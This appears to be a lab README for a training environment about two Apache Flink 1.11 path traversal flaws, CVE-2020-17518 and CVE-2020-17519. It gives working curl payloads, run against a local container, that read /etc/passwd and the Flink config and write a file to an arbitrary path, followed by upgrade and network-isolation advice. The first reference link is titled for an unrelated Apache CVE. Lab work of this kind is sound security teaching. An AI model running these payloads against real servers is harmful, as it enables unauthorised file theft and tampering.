# Apache Flink REST API Directory Traversal & Arbitrary File Access (CVE-2020-17518 / CVE-2020-17519)

## Overview

Apache Flink is an open-source stream-processing framework for distributed, high-performing, always-available, and accurate data streaming applications.

Versions 1.11.0, 1.11.1, and 1.11.2 of Apache Flink contain two severe directory traversal vulnerabilities within its JobManager REST API:

1. **CVE-2020-17518 (Arbitrary File Write)**: A vulnerability in the REST handler allows an unauthenticated remote attacker to write uploaded files to arbitrary locations on the local filesystem of the JobManager via path traversal sequences in multipart upload parameters.
2. **CVE-2020-17519 (Arbitrary File Read)**: A directory traversal vulnerability in the `JobManagerCustomLogHandler` enables remote unauthenticated attackers to read arbitrary files from the JobManager host filesystem via double-URL-encoded directory traversal sequences.

- **Web Dashboard**: `http://localhost:8135/`
- **Docker Shortcut**: `./lab start flink-traversal`
- **Container Name**: `cyberlab_04_flink_path_traversal`
- **RAM Footprint**: ~400 MB

---

## Exploitation Walkthrough

### 1. Arbitrary File Read (CVE-2020-17519)

Query the JobManager custom log endpoint using double URL-encoded path traversal sequences (`%252f` for `/`):

```bash
curl 'http://localhost:8135/jobmanager/logs/..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
```

Output:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
flink:x:9999:9999::/opt/flink:/bin/sh
```

Inspect sensitive runtime configurations or credentials:

```bash
curl 'http://localhost:8135/jobmanager/logs/..%252f..%252f..%252f..%252fopt%252fflink%252fconf%252fflink-conf.yaml'
```

### 2. Arbitrary File Write (CVE-2020-17518)

Upload a file with directory traversal in the filename field to the `/jars/upload` endpoint:

```bash
curl -i -X POST 'http://localhost:8135/jars/upload' \
  -F 'jarfile=@payload.txt;filename=../../../../../../tmp/pwned_flink.txt'
```

Verify that the file was written to the target location inside the container:

```bash
docker exec -it cyberlab_04_flink_path_traversal cat /tmp/pwned_flink.txt
```

---

## Defensive Remediation & Hardening

1. **Upgrade Apache Flink**:
   Upgrade to Apache Flink 1.11.3 or 1.12.0 or newer. These versions sanitize file paths and canonicalize incoming URIs before resolving file references.
2. **Network Isolation**:
   Do not expose the Apache Flink REST API (`8081`) directly to untrusted networks or the public internet. Enforce mutual TLS (mTLS) and authenticate access via an upstream reverse proxy.

---

## Video Walkthroughs & Technical References

- [Bugcrowd Security Flash - Apache CVE 2021-41773](https://www.youtube.com/watch?v=x0Bk7nqeB4k)
- [Apache Flink Security Advisory CVE-2020-17518](https://lists.apache.org/thread/43aboo092jj0x0yz9kvlr453lw8thq85)
- [Apache Flink Security Advisory CVE-2020-17519](https://lists.apache.org/thread/jjymvtftbp6pjhdvf55oh3svx8d8r515)
- [Vulhub Apache Flink CVE-2020-17518 / CVE-2020-17519 Environment](https://vulhub.org/#/environments/flink/CVE-2020-17518/)
